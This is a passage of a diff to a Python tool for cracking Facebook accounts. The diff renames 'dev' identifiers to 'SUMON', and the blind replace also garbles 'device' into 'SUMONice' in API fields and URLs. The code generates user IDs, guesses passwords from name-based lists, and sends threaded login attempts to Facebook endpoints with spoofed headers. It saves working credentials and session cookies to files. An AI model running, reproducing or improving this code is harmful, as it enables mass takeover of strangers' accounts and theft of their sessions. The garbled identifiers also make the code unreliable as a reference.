+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
-def dev5():
+def SUMON5():
     user=[]
     os.system('clear')
     print(logo)
@@ -1266,7 +1246,7 @@ def dev5():
         HamiiID.append(pww)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
     print(" [2] METHOD (METHOD2) ")
     print(" [3] METHOD (METHOD3) ")
@@ -1274,7 +1254,7 @@ def dev5():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [+] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1283,34 +1263,34 @@ def dev5():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         os.system("clear")
         print(logo)
         tl = str(len(user))
         print(f"[+] YOUR CODE CHOOSED : "+code)
         print(f"[+] YOUR TOTAL IDZ : "+tl+" ")
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = code+love
             pwx = [love,uid[:6]]
             for Eman in HamiiID:
                 pwx.append(Eman)
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
-def dev6():
+def SUMON6():
     user=[]
     os.system('clear')
     print(logo)
@@ -1324,7 +1304,7 @@ def dev6():
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
     print(" [2] METHOD (METHOD2) ")
     print(" [3] METHOD (METHOD3) ")
@@ -1332,7 +1312,7 @@ def dev6():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1341,31 +1321,31 @@ def dev6():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
-        dev_time()
+        SUMON_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{devfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             mk = uid[:6]
             pwx = [love]
             pwx = [kode+love,mk,'free fire','i love you','57273200']
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
 def n_clone():
@@ -1412,7 +1392,7 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, dev ")
+    print(" Ex First : ayesha, kazim, SUMON ")
     print(" Ex Last  : rajput, channa, aaraya ")
     print(47*'-')
     first = input(' [â¢] First Name : ')
@@ -1430,7 +1410,7 @@ def g_clone():
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
-    print("[+]ââââââââââââââââââââââââââââââââââââââââ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
     print(" [2] METHOD (METHOD2) ")
     print(" [3] METHOD (METHOD3) ")
@@ -1438,7 +1418,7 @@ def g_clone():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    devfire = input("[+] [CHOOSE] :- ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -1447,7 +1427,7 @@ def g_clone():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as dev_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         tl = str(len(user))
         os.system("clear")
         print(logo)
@@ -1458,25 +1438,25 @@ def g_clone():
         for love in user:
             uid = first+'.'+last+'.'+love+domain
             pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
-            if devfire =='1':dev_xd.submit(mbasic,uid,pwx,tl)
-            elif devfire =='2':dev_xd.submit(p,uid,pwx,tl)
-            elif devfire =='3':dev_xd.submit(x,uid,pwx,tl)
-            elif devfire =='4':dev_xd.submit(mobile,uid,pwx,tl)
-            elif devfire =='5':dev_xd.submit(freeq,uid,pwx,tl)
-            elif devfire =='6':dev_xd.submit(d,uid,pwx,tl)
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
             else:
-                dev_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE DEV-OK TXT')
+    print('[â] ID SAVE SUMON-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [DEV-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [SUMON-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -1487,7 +1467,7 @@ def freefb(uid, name, pwx, tl):
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
             session = requests.Session()
-            ua = random.choice(devua)
+            ua = random.choice(SUMONua)
             free_fb = session.get("https://m.facebook.com").text
             data = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1503,7 +1483,7 @@ def freefb(uid, name, pwx, tl):
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
-            'path': '/login/device-based/login/async/',
+            'path': '/login/SUMONice-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1530,24 +1510,24 @@ def freefb(uid, name, pwx, tl):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post("https://mbasic.facebook.com/login/device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            lo = session.post("https://mbasic.facebook.com/login/SUMONice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                print(f" {green}[DEV-OK] {uid}|{pw}")
+                print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/dev_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "checkpoint" in log_cookies:
                 if "Enter login code to continue" in log_cookies:
-                    print(f" {cyan}[DEV-2F] {uid}|{pw}")
-                    open("/sdcard/dev_file_2F.txt", "a").write(f"{uid}|{pw}\n")
+                    print(f" {cyan}[SUMON-2F] {uid}|{pw}")
+                    open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                     twf.append(uid+"|"+pw)
                     break
                 else:
-                   #print(f" {red}[DEV-CP] {uid}|{pw}")
-                    open("/sdcard/dev_file_cp.txt", "a").write(f"{uid}|{pw}\n")
+                   #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                    open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid+"|"+pw)
                     break
             else:
@@ -1562,7 +1542,7 @@ def bapi(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [DEV-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [SUMON-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -1576,14 +1556,14 @@ def bapi(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1610,7 +1590,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1622,14 +1602,14 @@ def bapi(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                print(f" {green}[DEV-OK] {uid}|{pw}")
+                print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/deV_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[DEV-CP] {uid}|{pw}")
-                open("/sdcard/dev_file_tf.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -1644,7 +1624,7 @@ def graph(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [DEV-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [SUMON-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -1658,14 +1638,14 @@ def graph(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1692,7 +1672,7 @@ def graph(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-device-group': str(random.randint(2000, 4000)),
+                'X-FB-SUMONice-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1704,14 +1684,14 @@ def graph(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                print(f" {green}[DEV-OK] {uid}|{pw}")
+                print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/dev_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-               #print(f" {red}[DEV-CP] {uid}|{pw}")
-                open("/sdcard/dev_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+               #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -1726,21 +1706,21 @@ def mbasic(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M1-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M1-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1764,10 +1744,10 @@ def mbasic(uid,pwx,tl):
                 'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'X-FB-Connection-Type': 'WIFI',
-                'X-FB-device-group': str(random.randint(2000, 4000)),
+                'X-FB-SUMONice-group': str(random.randint(2000, 4000)),
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1788,13 +1768,13 @@ def mbasic(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/Dev_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -1809,21 +1789,21 @@ def p(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M2-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M2-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1850,7 +1830,7 @@ def p(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1871,13 +1851,13 @@ def p(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/Dev_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -1892,8 +1872,8 @@ def x(uid,pwx,tl):
     global loop
     global oks
     global cps
-    global devua
-    sys.stdout.write('\r\33[1;37m[M3-DEV] %s|OK:%s \r'%(loop,len(oks))),
+    global SUMONua
+    sys.stdout.write('\r\33[1;37m[M3-SUMON] %s|OK:%s \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -1932,36 +1912,36 @@ def x(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/SUMONice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cok = session.cookies.get_dict()
                 cid = cok["c_user"]
-                d = "dev"
+                d = "SUMON"
                 if "live" in check_lock(cid):
                     if '%3A-1%3A-1' in coki:
-                        print('\33[1;94m[DEV-NV] '+cid+' | '+ps+'\33[0;97m')
+                        print('\33[1;94m[SUMON-NV] '+cid+' | '+ps+'\33[0;97m')
                         break
                     else:
-                        print('\33[1;92m[DEV-OK] '+cid+' | '+ps+'\33[0;97m')
+                        print('\33[1;92m[SUMON-OK] '+cid+' | '+ps+'\33[0;97m')
                         if "yes" in cookie_show:
                             print(f"\033[1;32mCOOKIES : {coki}")
-                            open('/sdcard/Dev-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
+                            open('/sdcard/SUMON-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                             oks.append(cid)
                             break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 if "Enter login code to continue" in log_cookies:
-                    #print('\33[1;94m[DEV-2F] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/Dev-2f.txt', 'a').write(uid+' | '+ps+'\n')
+                    #print('\33[1;94m[SUMON-2F] '+uid+' | '+ps+'\33[0;97m')
+                    open('/sdcard/SUMON-2f.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                     break
                 else:
-                    #print('\33[1;91m[DEV-CP] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+ps+'\n')
+                    #print('\33[1;91m[SUMON-CP] '+uid+' | '+ps+'\33[0;97m')
+                    open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                     cps.append(uid)
                     break
             else:
@@ -1978,21 +1958,21 @@ def mobile(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M4-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M4-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2019,7 +1999,7 @@ def mobile(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2040,13 +2020,13 @@ def mobile(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/Dev_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -2061,21 +2041,21 @@ def freeq(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M5-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M5-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2102,7 +2082,7 @@ def freeq(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-device-group': '5120',
+                'x-fb-SUMONice-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2121,13 +2101,13 @@ def freeq(uid,pwx,tl):
                 except:
                     uid = uid
                 if result["is_account_confirmed"] == False:
-                    print(f" {green}[DEV-OK] {uid}|{pw}")
+                    print(f" {green}[SUMON-OK] {uid}|{pw}")
                    #print(f" {green}[COOKIES] {red}{coki}")
-                    open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 else:
-                    print(f" {green}[DEV-OK] {uid}|{pw}")
+                    print(f" {green}[SUMON-OK] {uid}|{pw}")
                    #print(f" {white}[COOKIES] {green}{coki}")
-                    open("/sdcard/deV_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     oks.append(uid)
                     break
             else:
@@ -2142,21 +2122,21 @@ def d(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M6-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M6-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'device_id': str(uuid.uuid4()),
+                'SUMONice_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
+                'family_SUMONice_id': str(uuid.uuid4()),
